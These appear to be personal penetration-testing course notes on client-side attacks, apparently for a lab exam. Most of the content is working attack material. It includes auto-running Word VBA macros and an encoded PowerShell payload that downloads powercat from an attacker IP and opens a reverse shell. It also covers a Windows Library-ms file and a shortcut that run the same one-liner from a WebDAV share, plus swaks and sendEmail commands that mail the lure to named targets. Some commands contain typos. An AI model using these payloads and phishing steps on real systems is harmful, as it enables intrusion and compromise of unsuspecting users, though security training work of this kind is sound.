## POWERSHELL POPUP:

```
Sub AutoOpen() MyMacro

End Sub  
Sub Document_Open()

MyMacro

End Sub  
Sub MyMacro() CreateObject("Wscript.Shell").Run "powershell"

End Sub
```

## Macro Invoking Powershell for ReverseShell (create a macro name MyMacro

- UTF-16 LE Base64 encode the following payload - https://www.base64encode.org/  
- IEX (New-ObjectSystem.Net.Webclient).DownloadString('http://192.168.119.3/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell  
• Split it using Split b64.py in pwk dir.

## Python script to split base64 encoded payload

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." n=50  
for i in range(0, len(str), n):

print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Add it in the following VBA code. Save it as docm or doc or dotx.

```macro
Sub AutoOpen() MyMacro

End Sub  
Sub Document_Open()

MyMacro End Sub

Sub MyMacro() Dim Str As String

Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"  
Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5" Str = Str + "nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnK"

Str = Str + "Ttwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4xODIgLXAgNDQ0NCA" Str = Str + "tZSBwb3dlcnNoZWxsCg=="  
CreateObject("Wscript.Shell").Run Str

End Sub
```

## CODE EXECUTION VIA WINDOWS LIBRARY FILES:  
Creating WebDav Dir, and test.txt file in it, Starting WebDav Server

- mkdir /home/kali/webdav  
- touch /home/kali/webdav/test.txt  
- /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ (Look in o/p to see its hosted on which port default 127.0.0.1:80)

## Windows Library Code For Connecting To WebDav Share (Change IP)

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name>  
<version>6</version>  
<isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference>  
<templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo>  
<searchConnectorDescriptionList>  
<searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported>  
<simpleLocation>  
<url>http://192.168.119.2</url>  
</simpleLocation>  
</searchConnectorDescription>  
</searchConnectorDescriptionList>  
</libraryDescription>
```

- Open Notepad and save it as config.Library-ms  
- Click on that config.Library-ms file in Desktop to see our WebDav Share with test.txt init

## Creating a Shortcut in Windows For Reverse Shell using PowerShell i.e., PowerCat

- Right Click on Windows > New > Shortcut
- Enter Powershell onliner for Downloading and Executing Powercat
- powershell.exe -c "IEX(New-ObjectSystem.Net.WebClient).DownloadString('http://192.168.45.177:8000/powercat.ps1');powercat -c 192.168.45.177 -p 4444 -e powershell"
- Click on Next and Save it as utomatic_configuration.

Copy config.Library-ms and automatic_configuration file inside config.Library.ms i.e., Place it it WebDav Share 
Sending emails with the Windows Library file as attachment
```
sudoswaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap (-t to, --from user creds we have --server mail server, body.txt dummy file with content)
```
    
## Reverse Shell (SMB or SMTP)
    
- Navigate to WebDav Folder in Kali
- smbclient //targetip/share -c 'put config.Library-ms'  
Simulated User will click on the reverse shell shortcut file and we'll get reverse shell

```
sendEmail -t dave.wizard@supermagicorg.com -f jaxor@hacker.com -s 192.168.182.199 -u Important Upgrade Instructions -a ~/webdav/config.Library-ms -m "Hi there" -xu test@supermagicorg.com -xp test 
```
(dave wizard user was identified in exif data, test@supermagicorg.com was identified by dir bf i.e., INFO.pdf )

Note: Above one will work even if -xu -xp were not used